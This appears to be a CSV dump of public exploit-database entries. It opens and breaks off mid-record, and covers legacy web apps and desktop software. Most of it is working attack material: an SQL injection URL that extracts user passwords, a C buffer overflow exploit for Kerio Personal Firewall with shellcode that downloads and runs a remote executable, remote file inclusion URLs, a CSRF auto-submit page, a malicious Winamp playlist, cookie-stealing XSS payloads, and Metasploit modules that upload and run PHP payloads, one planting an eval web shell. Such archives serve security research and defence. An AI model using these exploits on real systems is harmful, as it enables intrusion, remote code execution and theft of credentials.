Pragma: no-cache Content-Length: 234 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8",Rmedia SMS,1
3187,"ASP NEWS 3.0 - 'news_detail.asp' SQL Injection ******************************************************************************* # Title   :  ASP NEWS <= V3 (news_detail.asp) Remote SQL Injection Vulnerability # Author  :  ajann # Contact :  :( # S.Page  :  http://www.planetgraphic.de/  *******************************************************************************  [[SQL]]]---------------------------------------------------------  http://[target]/[path]//news_detail.asp?id=[SQL]  Example:  //news_detail.asp?id=-1%20union%20select%200,username,password,0,0,0%20from%20tblusers  [[/SQL]]  """""""""""""""""""""""""""""""""""""""""" # ajann,Turkey # ...  # Im not Hacker!  # milw0rm.com [2007-01-24]",ASP NEWS,1
28,"Kerio Personal Firewall 2.1.4 - Remote Code Execution /*  * Kerio Personal Firewall v2.1.4 remote code execution exploit   * Tested on Windows XP with SP1  *   * In order to exploit, for ease of mind, set the firewall to permit all traffic, or allow  * a connection to port 44334 from your testing unix shell ip.  *   * It is also possible to use UDP instead of TCP  *   * It works out very well, if not, hit a few times with a ret addr of 0x41414141 to make it crash   * AT THAT addr. Then use the original one, it will work. The one I used points to a 'call esp'  * inside the RPCRT4.DLL.  */  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <errno.h> #include <string.h> #include <netdb.h> #include <sys/types.h> #include <netinet/in.h> #include <sys/socket.h>  #define PORT 44334 // the port client will be connecting to, default Kerio admin port  #define retpos 5272	 #define MAXDATASIZE 5277 // max number of bytes we can get, also size of buffer  // global vars  struct sockaddr_in their_addr; // connector's address information  char buf[MAXDATASIZE]; int numbytes;  unsigned char shellcode[] = ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""    ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""    ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""   ""\xEB\x30\x5F\xFC\x8B\xF7\x80""    ""\x3F\x08\x75\x03\x80\x37\x08\x47\x80\x3F\x01\x75\xF2\x8B\xE6\x33\xD2\xB2\x04\xC1""    ""\xE2\x08\x2B\xE2\x8B\xEC\x33\xD2\xB2\x03\xC1\xE2\x08\x2B\xE2\x54\x5A\xB2\x7C\x8B""    ""\xE2\xEB\x02\xEB\x57\x89\x75\xFC\x33\xC0\xB4\x40\xC1\xE0\x08\x89\x45\xF8\x8B\x40""    ""\x3C\x03\x45\xF8\x8D\x40\x7E\x8B\x40\x02\x03\x45\xF8\x8B\xF8\x8B\x7F\x0C\x03\x7D""    ""\xF8\x81\x3F\x4B\x45\x52\x4E\x74\x07\x83\xC0\x14\x8B\xF8\xEB\xEB\x50\x8B\xF8\x33""    ""\xC9\x33\xC0\xB1\x10\x8B\x17\x03\x55\xF8\x52\xEB\x03\x57\x8B\xD7\x80\x7A\x03\x80""    ""\x74\x16\x8B\x32\x03\x75\xF8\x83\xC6\x02\xEB\x02\xEB\x7E\x8B\x7D\xFC\x51\xF3\xA6""    ""\x59\x5F\x74\x06\x40\x83\xC7\x04\xEB\xDB\x5F\x8B\x7F\x10\x03\x7D\xF8\xC1\xE0\x02""    ""\x03\xF8\x8B\x07\x8B\x5D\xFC\x8D\x5B\x11\x53\xFF\xD0\x89\x45\xF4\x8B\x40\x3C\x03""    ""\x45\xF4\x8B\x70\x78\x03\x75\xF4\x8D\x76\x1C\xAD\x03\x45\xF4\x89\x45\xF0\xAD\x03""    ""\x45\xF4\x89\x45\xEC\xAD\x03\x45\xF4\x89\x45\xE8\x8B\x55\xEC\x8B\x75\xFC\x8D\x76""    ""\x1E\x33\xDB\x33\xC9\xB1\x0F\x8B\x3A\x03\x7D\xF4\x56\x51\xF3\xA6\x59\x5E\x74\x06""    ""\x43\x8D\x52\x04\xEB\xED\xD1\xE3\x8B\x75\xE8\x03\xF3\x33\xC9\x66\x8B\x0E\xEB\x02""    ""\xEB\x7D\xC1\xE1\x02\x03\x4D\xF0\x8B\x09\x03\x4D\xF4\x89\x4D\xE4\x8B\x5D\xFC\x8D""    ""\x5B\x2D\x33\xC9\xB1\x07\x8D\x7D\xE0\x53\x51\x53\x8B\x55\xF4\x52\x8B\x45\xE4\xFC""    ""\xFF\xD0\x59\x5B\xFD\xAB\x8D\x64\x24\xF8\x38\x2B\x74\x03\x43\xEB\xF9\x43\xE2\xE1""    ""\x8B\x45\xE0\x53\xFC\xFF\xD0\xFD\xAB\x33\xC9\xB1\x04\x8D\x5B\x0C\xFC\x53\x51\x53""    ""\x8B\x55\xC4\x52\x8B\x45\xE4\xFF\xD0\x59\x5B\xFD\xAB\x38\x2B\x74\x03\x43\xEB\xF9""    ""\x43\xE2\xE5\xFC\x33\xD2\xB6\x1F\xC1\xE2\x08\x52\x33\xD2\x52\x8B\x45\xD4\xFF\xD0""    ""\x89\x45\xB0\x33\xD2\xEB\x02\xEB\x77\x52\x52\x52\x52\x53\x8B\x45\xC0\xFF\xD0\x8D""    ""\x5B\x03\x89\x45\xAC\x33\xD2\x52\xB6\x80\xC1\xE2\x10\x52\x33\xD2\x52\x52\x8D\x7B""    ""\x09\x57\x50\x8B\x45\xBC\xFF\xD0\x89\x45\xA8\x8D\x55\xA0\x52\x33\xD2\xB6\x1F\xC1""    ""\xE2\x08\x52\x8B\x4D\xB0\x51\x50\x8B\x45\xB8\xFF\xD0\x8B\x4D\xA8\x51\x8B\x45\xB4""    ""\xFF\xD0\x8B\x4D\xAC\x51\x8B\x45\xB4\xFF\xD0\x33\xD2\x52\x53\x8B\x45\xDC\xFF\xD0""    ""\x89\x45\xA4\x8B\x7D\xA0\x57\x8B\x55\xB0\x52\x50\x8B\x45\xD8\xFF\xD0\x8B\x55\xA4""    ""\x52\x8B\x45\xD0\xFF\xD0\xEB\x02\xEB\x12\x33\xD2\x90\x52\x53\x8B\x45\xCC\xFF\xD0""    ""\x33\xD2\x52\x8B\x45\xC8\xFF\xD0\xE8\xE6\xFD\xFF\xFF\x47\x65\x74\x4D\x6F\x64\x75""    ""\x6C\x65\x48\x61\x6E\x64\x6C\x65\x41\x08\x6B\x65\x72\x6E\x65\x6C\x33\x32\x2E\x64""    ""\x6C\x6C\x08\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72\x65\x73\x73\x08\x4C\x6F""    ""\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x08\x5F\x6C\x63\x72\x65\x61\x74\x08\x5F""    ""\x6C\x77\x72\x69\x74\x65\x08\x47\x6C\x6F\x62\x61\x6C\x41\x6C\x6C\x6F\x63\x08\x5F""    ""\x6C\x63\x6C\x6F\x73\x65\x08\x57\x69\x6E\x45\x78\x65\x63\x08\x45\x78\x69\x74\x50""    ""\x72\x6F\x63\x65\x73\x73\x08\x77\x69\x6E\x69\x6E\x65\x74\x2E\x64\x6C\x6C\x08\x49""    ""\x6E\x74\x65\x72\x6E\x65\x74\x4F\x70\x65\x6E\x41\x08\x49\x6E\x74\x65\x72\x6E\x65""    ""\x74\x4F\x70\x65\x6E\x55\x72\x6C\x41\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x52\x65""    ""\x61\x64\x46\x69\x6C\x65\x08\x49\x6E\x74\x65\x72\x6E\x65\x74\x43\x6C\x6F\x73\x65""    ""\x48\x61\x6E\x64\x6C\x65\x08\x4E\x53\x08\x6E\x73\x73\x63\x2E\x65\x78\x65\x08""   ""http://reversedhell.net/hackyou.exe""   ""\x08\x01""; // download + exec from the net ; donno who wrote this sc      //change the url to whatever, this one pops up an innofensive message box  // end of global vars  int suck(int sock,int n) // painfull function to get rid of the painfull Kerio protocol { 	int i=0,j=0,k,a=0,b=0,c=0,d=0;  	while (i<n) 	{  		if ((numbytes=recv(sock, buf, n, 0)) == -1) {             	perror(""recv"");             	exit(1); 	       }          	if (j) i+=(numbytes-1); // ya i know i know :D                 	else i+=numbytes;          	for (k=0;k<numbytes;k++) {         					if (k % 10 == 0) fprintf(stderr,""\n"");         					if (buf[k]==0) fprintf(stderr,""    0 "");         					else fprintf(stderr,"" %4.0d "",buf[k]);         				     }	           	fprintf(stderr,""    * "");         	j++;         	d=buf[numbytes];         	c=buf[numbytes-1];         	b=buf[numbytes-2];         	a=buf[numbytes-3];         	if ((i>200) && (a==0x1) && (b==0x0) && (c==0x1) && (d==0x0)) break;         }         fprintf(stderr,""\n"");         return i; }       int main(int argc, char *argv[])     {         int sockfd, i,j;           struct hostent *he;           if (argc != 2) {             fprintf(stderr,""usage: ./%s hostname\n"",argv[0]);             exit(1);         }          if ((he=gethostbyname(argv[1])) == NULL) {  // get the host info              perror(""gethostbyname"");             exit(1);         }          if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) { // prepare a socket for connecting             perror(""socket"");             exit(1);         }          their_addr.sin_family = AF_INET;    // host byte order          their_addr.sin_port = htons(PORT);  // short, network byte order          their_addr.sin_addr = *((struct in_addr *)he->h_addr);         memset(&(their_addr.sin_zero), '\0', 8);  // zero the rest of the struct           if (connect(sockfd, (struct sockaddr *)&their_addr,sizeof(struct sockaddr)) == -1) {             perror(""connect"");             exit(1);         }                    fprintf(stderr,""shell len = %d\n"",strlen(shellcode)); 	 fprintf(stderr,""Connected to firewall.\n""); 	 memset(buf,0x0,sizeof(buf)); 	 fprintf(stderr,""Sucking buffer..\n"");         suck(sockfd,266);         fprintf(stderr,""\nBuffer sucked by black hole..\n"");     	 memset(buf,0x0,sizeof(buf));     	 fprintf(stderr,""-------------------------------------------------\n"");     	 fprintf(stderr,""                 - BANNER -   \n"");     	 fprintf(stderr,""-------------------------------------------------\n"");     	 sleep(1); 	 fprintf(stderr,""coded by Burebista (aanton@reversedhell.net)\n""); 	 fprintf(stderr,""           released on - 5 Apr 2003 -\n""); 	  	 sleep(2);     	 fprintf(stderr,""-------------------------------------------------\n""); 	 memset(buf,0x90,MAXDATASIZE); // set nops all over 	  	 // prepares call up to beginning of buffer 32 bit=5 bytes 	 buf[MAXDATASIZE-1]='\xff'; // 	 buf[MAXDATASIZE-2]='\xff'; // call -1150 	 buf[MAXDATASIZE-3]='\xee'; // 	 buf[MAXDATASIZE-4]='\xab'; // 	 buf[MAXDATASIZE-5]='\xe8'; // 	  						 	 j=0;                    // insert the shellcode in buf at 900 	 for (i=900;j<strlen(shellcode);i++) buf[i]=shellcode[j++];  	  	 // prepares the new return address (on XPSP1 it is CALL ESP in RPCRT4.DLL) 	 	 buf[retpos-1]='\x78'; 	 buf[retpos-2]='\x07'; 	 buf[retpos-3]='\x06'; 	 buf[retpos-4]='\x90'; 	  	 // this prepares packet header with negative length  	  	 buf[0]=0; 	 buf[1]=0; 	 buf[2]=0x14; 	 buf[3]=0xffffff9c; // negative, -100. firewall will prepare 	                          // buf of that size. signed integers hit again 	/*          The 4th byte in the packet is the size of what the firewall will be expecting to receive         right ahead. If we send longer buffer then what we told the firewall to expect, it will be         simply truncated and nothing cool will happen. The problem is Kerio never thought we could         tell it something that stupid like we are going to send -100 bytes, it is like expecting a         client to buy -20 books from your library, which is an absurdity. There is no checking to         make sure the user input is valid. Again, invalid trusted user input. What they should have         done is either to use the 4th byte inside a modulus, to make sure it is always positive,         either lamingly check if it is negative, and if true, stop processing the inputted data.                  	             What's so funny?                    	*/ 	  	 if ((send(sockfd, buf,sizeof(buf),0)) == -1 ) { // PASARAN!  		perror(""send""); 		exit(1); 	 } 	 fprintf(stderr,""..pasaran...\n""); 	 fprintf(stderr,"":D Done!\n""); 	          close(sockfd);        }   // milw0rm.com [2003-05-08]",Kerio Personal Firewall,1
1817,"Docebo 3.0.3 - Multiple Remote File Inclusions ################ DEVIL TEAM THE BEST POLISH TEAM ################# #Docebo 3.0.3/DoceboCMS,DoceboKms,DoceboLms,DoceboCore,DoceboScs - Remote File Include Vulnerabilities #Find by Kacper (Rahim). #Greetings For ALL DEVIL TEAM members, Special DragonHeart :*** #Contact: kacper1964@yahoo.pl   or   http://www.devilteam.yum.pl #################################################################### #Docebo Site: http://www.docebocms.org ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ In All scripts: [code] require_once($GLOBALS['where_framework'].'/lib/lib.permission.php'); require_once($GLOBALS['where_framework'].'/lib/lib.pagewriter.php'); require_once($GLOBALS['where_framework'].'/lib/lib.lang.php'); require_once($GLOBALS['where_framework'].'/lib/lib.template.php'); require_once($GLOBALS['where_framework'].'/lib/lib.mimetype.php'); [/code]  #DoceboCMS:  http://www.site.com/docebocms/lib/lib.simplesel.php?GLOBALS[where_framework]=[evil_code]  #DoceboKms:  http://www.site.com/doceboKms/modules/documents/lib.filelist.php?GLOBALS[where_framework]=[evil_code]  http://www.site.com/doceboKms/modules/documents/tree.documents.php?GLOBALS[where_framework]=[evil_code]  #DoceboLms:  http://www.site.com/doceboLms/lib/lib.repo.php?GLOBALS[where_framework]=[evil_code]  #DoceboCore:  http://www.site.com/doceboCore/lib/lib.php?GLOBALS[where_framework]=[evil_code]  #DoceboScs:  http://www.site.com/doceboScs/lib/lib.teleskill.php?GLOBALS[where_scs]=[evil_code]  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #The End ;-) #Pozdro Dla wszystkich o których zapomnia.em ;-)  # milw0rm.com [2006-05-23]",Docebo,1
18592,"4Images Image Gallery Management System - Cross-Site Request Forgery ######################################################################################################## # Title: 4images - Image Gallery Management System - [CSRF] Change mail user or admin    # Author: Dmar al3noOoz    # Mail : wafee_s[at]hotmail.com   # Name : 4images - Image Gallery Management System  # dork : Google Dork: ""4images - Image Gallery Management System""  # Software Link : http://www.4homepages.de  # Version: 1.7.7   ##############################################  Exploit  ##############################################    <html> <body onload=""javascript:fireForms()""> <script language=""JavaScript""> var pauses = new Array( ""1062"" );  function pausecomp(millis) {     var date = new Date();     var curDate = null;      do { curDate = new Date(); }     while(curDate-date < millis); }  function fireForms() {     var count = 1;     var i=0;          for(i=0; i<count; i++)     {         document.forms[i].submit();                  pausecomp(pauses[i]);     } }      </script> <form method=""POST"" name=""form0"" action=""http://www.XXXXXX.com/patch/member.php""> <input type=""hidden"" name=""user_email"" value=""you mail""/> <input type=""hidden"" name=""user_email2"" value=""you mail""/> <input type=""hidden"" name=""action"" value=""updateprofile""/> </form> </body> </html>    -=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=-Greetz-=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=- -=- v4-team.com - Evil-Cod3r - dmar hacker - dr.Dmar - Dmaral7roOob - Ra7aLAlgnob - Mr.law - Alkeasr20 - Mr.black - Cyber-CrysTaL    -=- -=-                                          Team 19vr - RootAl3noz - all Friend - exploit-db.com                                    -=- -=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-",4Images Image Gallery Management System,1
25061,"NullSoft Winamp 5.0.x - Variant 'IN_CDDA.dll' Remote Buffer Overflow (PoC) source: https://www.securityfocus.com/bid/12381/info  A remote buffer overflow vulnerability affects the IN_CDDA.dll library of Nullsoft's Winamp. This issue is due to a failure of the application to properly validate the length of user-supplied strings prior to copying them into finite process buffers. It should be noted that this issue is not related to the issue outlined in BID 11730 (Nullsoft Winamp IN_CDDA.dll Remote Buffer Overflow Vulnerability).  This issue will facilitate remote exploitation as an attacker may distribute malicious play-list files and entice unsuspecting users to process them with the affected application.  #EXTM3U #EXTINF:5,DJ Mike Llama - Llama Whippin' Intro cda://AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHnT _IJJJ‹å3ÿWƒìÆEøcÆEùmÆEúdÆEû.ÆEüeÆEýxÆEþe¸D€¿wP]øSÿÐ",(Nullsoft Winamp,1
15981,"LifeType 1.2.10 - HTTP Referer Persistent Cross-Site Scripting # Exploit Title: lifetype 1.2.10 http referer XSS # Date: 11-1-2010 # Author: Saif El-Sherei # Software Link: http://lifetype.net/page/downloads # Version: 1.2.10 # Tested on: firefox 3.0.15  failure to sanitize the http referer header in index.php results in a cross site scripting attack against admins or any user able to view blog statistics. an attacker could use an intercepting proxy or manual requests to perform this attack, the referer is recorder into the database when visiting any section in the index.php (albums, archives,etc....), a user with only the privilege  to login could perform this attack, the issue affects all browsers.  POC:  referer HTTP header: http://127.0.0.1/lifetype-1.2.10/index.php?op=Template&blogId=1&show=archives""><script>alert('XSS')</script>  timeline:  vulnerability dicovered: 11-1-2011 vendor notified: 11-1-2011",LifeType,1
30993,Snitz Forums 2000 3.4.5/3.4.6 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/27162/info  Snitz Forums 2000 is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Snitz Forums 2000 2.4.05 and 3.4.06 are vulnerable; other versions may also be affected.   http://www.example.com/Forums/setup.asp?RC=3&MAIL=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E http://www.example.com/login.asp?target=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E,Snitz Forums,1
23651,"WordPress Plugin WP-Property - Arbitrary '.PHP' File Upload (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##   require 'msf/core' require 'msf/core/exploit/php_exe'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient 	include Msf::Exploit::PhpEXE  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'WordPress WP-Property PHP File Upload Vulnerability', 			'Description'    => %q{ 					This module exploits a vulnerability found in WP-Property <= 1.35.0 WordPress 				plugin. By abusing the uploadify.php file, a malicious user can upload a file to a 				temp directory without authentication, which results in arbitrary code execution. 			}, 			'Author'         => 				[ 					'Sammy FORGIT',	# initial discovery 					'James Fitts <fitts.james[at]gmail.com>' # metasploit module 				], 			'License'        => MSF_LICENSE, 			'References'     => 				[ 					[ 'OSVDB', '82656' ], 					[ 'BID', '53787' ], 					[ 'EDB', '18987'], 					[ 'URL', 'http://www.opensyscom.fr/Actualites/wordpress-plugins-wp-property-shell-upload-vulnerability.html' ] 				], 			'Payload'	     => 				{ 					'BadChars' => ""\x00"", 				}, 			'Platform'       => 'php', 			'Arch'		     => ARCH_PHP, 			'Targets'        => 				[ 					[ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ], 					[ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ] 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Mar 26 2012'))  		register_options( 			[ 				OptString.new('TARGETURI', [true, 'The full URI path to WordPress', '/wordpress']) 			], self.class) 	end  	def check 		uri =  target_uri.path 		uri << '/' if uri[-1,1] != '/'  		res = send_request_cgi({ 			'method' => 'GET', 			'uri'    => ""#{uri}wp-content/plugins/wp-property/third-party/uploadify/uploadify.php"" 		})  		if not res or res.code != 200 			return Exploit::CheckCode::Unknown 		end  		return Exploit::CheckCode::Appears 	end  	def exploit 		uri =  target_uri.path 		uri << '/' if uri[-1,1] != '/'  		peer = ""#{rhost}:#{rport}""  		@payload_name = ""#{rand_text_alpha(5)}.php"" 		php_payload = get_write_exec_payload(:unlink_self=>true)  		data = Rex::MIME::Message.new 		data.add_part(php_payload, ""application/octet-stream"", nil, ""form-data; name=\""Filedata\""; filename=\""#{@payload_name}\"""") 		data.add_part(""#{uri}wp-content/plugins/wp-property/third-party/uploadify/"", nil, nil, ""form-data; name=\""folder\"""") 		post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')  		print_status(""#{peer} - Uploading payload #{@payload_name}"") 		res = send_request_cgi({ 			'method' => 'POST', 			'uri'    => ""#{uri}wp-content/plugins/wp-property/third-party/uploadify/uploadify.php"", 			'ctype'  => ""multipart/form-data; boundary=#{data.bound}"", 			'data'   => post_data 		})  		if not res or res.code != 200 or res.body !~ /#{@payload_name}/ 			fail_with(Exploit::Failure::UnexpectedReply, ""#{peer} - Upload failed"") 		end  		upload_uri = res.body  		print_status(""#{peer} - Executing payload #{@payload_name}"") 		res = send_request_raw({ 			'uri'    => upload_uri, 			'method' => 'GET' 		}) 	end end",WordPress Plugin WP-Property,1
21929,"Project Pier - Arbitrary File Upload (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient 	include Msf::Exploit::EXE  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""Project Pier Arbitrary File Upload Vulnerability"", 			'Description'    => %q{ 					This module exploits a vulnerability found in Project Pier.  The application's 				uploading tool does not require any authentication, which allows a malicious user 				to upload an arbitrary file onto the web server, and then cause remote code 				execution by simply requesting it. This module is known to work against Apache 				servers due to the way it handles an extension name, but the vulnerability may 				not be exploitable on others. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'BlackHawk', 					'sinn3r' 				], 			'References'     => 				[ 					['OSVDB', '85881'], 					['URL', 'http://packetstormsecurity.org/files/117070/ProjectPier-0.8.8-Shell-Upload.html'] 				], 			'Platform'       => ['linux', 'php'], 			'Targets'        => 				[ 					[ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ], 					[ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ] 				], 			'Arch'           => ARCH_CMD, 			'Privileged'     => false, 			'DisclosureDate' => ""Oct 8 2012"", 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptString.new('TARGETURI', [true, 'The path to the web application', '/pp088/']) 			], self.class) 	end   	def check 		target_uri.path << '/' if target_uri.path[-1,1] != '/' 		base = File.dirname(""#{target_uri.path}."")  		res = send_request_cgi( 			{ 				'method' => 'GET', 				'uri'    => ""#{base}/index.php"", 				'vars_get' => 					{ 						'c' => 'access', 						'a' => 'login' 					} 			})  		if res and res.body =~ /Welcome to ProjectPier 0\.8\.[0-8]/ and res.headers['Server'] =~ /^Apache/ 			return Exploit::CheckCode::Vulnerable 		else 			return Exploit::CheckCode::Safe 		end 	end  	def get_write_exec_payload(fname, data) 		p = Rex::Text.encode_base64(generate_payload_exe) 		php = %Q| 		<?php 		$f = fopen(""#{fname}"", ""wb""); 		fwrite($f, base64_decode(""#{p}"")); 		fclose($f); 		exec(""chmod 777 #{fname}""); 		exec(""#{fname}""); 		?> 		| 		php = php.gsub(/^\t\t/, '').gsub(/\n/, ' ') 		return php 	end  	def on_new_session(cli) 		if cli.type == ""meterpreter"" 			cli.core.use(""stdapi"") if not cli.ext.aliases.include?(""stdapi"") 		end  		@clean_files.each do |f| 			print_debug(""#{@peer} - Removing: #{f}"") 			begin 				if cli.type == 'meterpreter' 					cli.fs.file.rm(f) 				else 					cli.shell_command_token(""rm #{f}"") 				end 				print_debug(""File removed: #{f}"") 			rescue ::Exception => e 				print_error(""#{@peer} - Unable to remove #{f}: #{e.message}"") 			end 		end 	end  	def upload_php(base, fname, php_payload, folder_name) 		data = Rex::MIME::Message.new 		data.add_part(folder_name, nil, nil, 'form-data; name=""folder""') 		data.add_part(php_payload, nil, nil, ""form-data; name=file; filename=\""#{fname}\"""") 		data.add_part('', nil, nil, 'form-data; name=""part""') 		data.add_part('Submit', nil, nil, 'form-data; name=""submit""')  		post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')  		res = send_request_cgi({ 			'method'  => 'POST', 			'uri'     => ""#{base}/tools/upload_file.php"", 			'ctype'   => ""multipart/form-data; boundary=#{data.bound}"", 			'data'    => post_data 		})  		return res.body if res 	end  	def exec_php(base, body) 		# Body example: 		# 0 ./upload/test/test.txt-0001 		uri = body.scan(/(\/.+$)/).flatten[0] 		@clean_files << File.basename(uri)  		res = send_request_raw({'uri' => ""#{base}/tools#{uri}""})  		if res and res.code == 404 			print_error(""#{@peer} - The upload most likely failed"") 			return 		end  		handler 	end  	def exploit 		@peer = ""#{rhost}:#{rport}""  		target_uri.path << '/' if target_uri.path[-1,1] != '/' 		base = File.dirname(""#{target_uri.path}."")  		folder_name = Rex::Text.rand_text_alpha(4) 		php_fname = ""#{Rex::Text.rand_text_alpha(5)}.php.1"" 		@clean_files = []  		case target['Platform'] 		when 'php' 			p = ""<?php #{payload.encoded} ?>"" 		when 'linux' 			bin_name = ""#{Rex::Text.rand_text_alpha(5)}.bin"" 			@clean_files << bin_name 			bin = generate_payload_exe 			p = get_write_exec_payload(""/tmp/#{bin_name}"", bin) 		end  		print_status(""#{@peer} - Uploading PHP payload (#{p.length.to_s} bytes)..."") 		res = upload_php(base, php_fname, p, folder_name)  		if not res 			print_error(""#{@peer} - No response from server"") 			return 		end  		print_status(""#{@peer} - Executing '#{php_fname}'..."") 		exec_php(base, res) 	end end",Project Pier,1
19630,"Tiki Wiki CMS Groupware 8.3 - 'Unserialize()' PHP Code Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Tiki Wiki <= 8.3 unserialize() PHP Code Execution', 			'Description'    => %q{ 					This module exploits a php unserialize() vulnerability in Tiki Wiki <= 8.3 				which could be abused to allow unauthenticated users to execute arbitrary code 				under the context of the webserver user.  				The dangerous unserialize() exists in the 'tiki-print_multi_pages.php' script, 				which is called with user controlled data from the 'printpages' parameter. 				The exploit abuses the __destruct() method from the Zend_Pdf_ElementFactory_Proxy 				class to write arbitrary PHP code to a file on the Tiki Wiki web directory.  				In order to run successfully three conditions must be satisfied (1) display_errors 				php setting must be On to disclose the filesystem path of Tiki Wiki, (2) The Tiki 				Wiki Multiprint feature must be enabled to exploit the unserialize() and (3) a php 				version older than 5.3.4 must be used to allow poison null bytes in filesystem related 				functions. The exploit has been tested successfully on Ubuntu 9.10 and Tiki Wiki 8.3. 			}, 			'Author'	=> 				[ 					'EgiX', # Vulnerability discovery and PoC 					'juan vazquez' # Metasploit module 				], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision$', 			'References'     => 				[ 					[ 'CVE', '2012-0911' ], 					[ 'BID', '54298' ], 					[ 'EDB', '19573' ], 					[ 'URL', 'http://dev.tiki.org/item4109' ] 				], 			'Privileged'     => false, 			'Platform'       => ['php'], 			'Arch'           => ARCH_PHP, 			'Payload'        => 				{ 					'DisableNops' => true, 				}, 			'Targets'        => [ ['Automatic', {}] ], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Jul 04 2012' 			))  			register_options( 				[ 					OptString.new('TARGETURI', [ true, ""The base path to the web application"", ""/tiki/""]) 				], self.class) 	end   	def on_new_session(client) 		if client.type == ""meterpreter"" 			client.core.use(""stdapi"") if not client.ext.aliases.include?(""stdapi"") 			begin 				client.fs.file.rm(@upload_php) 				print_good(""#{@peer} - #{@upload_php} removed to stay ninja"") 			rescue 				print_error(""#{@peer} - Unable to remove #{f}"") 			end 		end 	end  	def exploit 		base = target_uri.path 		base << '/' if base[-1, 1] != '/' 		@upload_php = rand_text_alpha(rand(4) + 4) + "".php"" 		@peer = ""#{rhost}:#{rport}""  		print_status(""#{@peer} - Disclosing the path of the Tiki Wiki on the filesystem"")  		res = send_request_cgi( 			'uri' => ""#{base}tiki-rss_error.php"" 		)  		if not res or res.code != 200 or not res.body =~ /[> ](\/.*)tiki-rss_error\.php/ 			print_error ""Tiki Wiki path couldn't be disclosed. The php setting 'display_errors' must be On."" 			return 		else 			tiki_path = $1 			print_good ""#{@peer} - Tiki Wiki path disclosure: #{tiki_path}"" 		end  		php_payload = ""<?php eval(base64_decode($_SERVER[HTTP_CMD])); ?>""  		printpages = ""O:29:\""Zend_Pdf_ElementFactory_Proxy\"":1:"" 		printpages << ""{s:39:\""%00Zend_Pdf_ElementFactory_Proxy%00_factory\"";O:51:\""Zend_Search_Lucene_Index_SegmentWriter_StreamWriter\"":5:"" 		printpages << ""{s:12:\""%00*%00_docCount\"";i:1;s:8:\""%00*%00_name\"";s:3:\""foo\"";s:13:\""%00*%00_directory\"";O:47:\""Zend_Search_Lucene_Storage_Directory_Filesystem\"":1:"" 		printpages << ""{s:11:\""%00*%00_dirPath\"";s:#{tiki_path.length + @upload_php.length + 1}:\""#{tiki_path + @upload_php}%00\"";}"" 		printpages << ""s:10:\""%00*%00_fields\"";a:1:"" 		printpages << ""{i:0;O:34:\""Zend_Search_Lucene_Index_FieldInfo\"":1:"" 		printpages << ""{s:4:\""name\"";s:#{php_payload.length}:\""#{php_payload}\"";}}"" 		printpages << ""s:9:\""%00*%00_files\"";O:8:\""stdClass\"":0:{}}}""  		print_status(""#{@peer} - Exploiting the unserialize() to upload PHP code"")  		res = send_request_cgi( 		{ 			'uri' => ""#{base}tiki-print_multi_pages.php"", 			'method' => 'POST', 			'vars_post' => { 				'printpages' => printpages 			} 		})  		if not res or res.code != 200 			